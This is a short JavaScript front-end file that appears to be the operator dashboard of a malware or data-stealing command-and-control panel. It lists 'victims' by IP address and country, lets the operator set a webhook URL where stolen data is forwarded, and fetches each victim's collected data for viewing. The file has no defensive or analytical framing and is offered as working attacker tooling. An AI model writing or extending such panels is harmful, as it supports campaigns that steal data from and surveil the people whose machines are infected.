// frontend/scripts/main.js
const victimList = document.getElementById('victim-list');
const webhookUrlInput = document.getElementById('webhook-url');
const saveWebhookButton = document.getElementById('save-webhook');

// Fetch victim list from backend
fetch('/clients')
  .then(response => response.json())
  .then(victims => {
    victims.forEach(victim => {
      const victimBox = document.createElement('div');
      victimBox.className = 'victim-box';
      victimBox.innerHTML = `
        <img src="flags/${victim.geoData.countryCode}.png" />
        <span>${victim.ip} (${victim.geoData.country})</span>
        <button onclick="viewVictimData('${victim.ip}')">View Data</button>
      `;
      victimList.appendChild(victimBox);
    });
  });

// Save webhook URL
saveWebhookButton.addEventListener('click', () => {
  const webhookUrl = webhookUrlInput.value;
  fetch('/webhook', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ webhookUrl })
  });
});

// Function to view victim data
const viewVictimData = (ip) => {
  // Fetch victim data from backend
  fetch(`/clients/${ip}`)
    .then(response => response.json())
    .then(victimData => {
      // Display victim data in a modal or popup
      console.log(victimData);
    });
};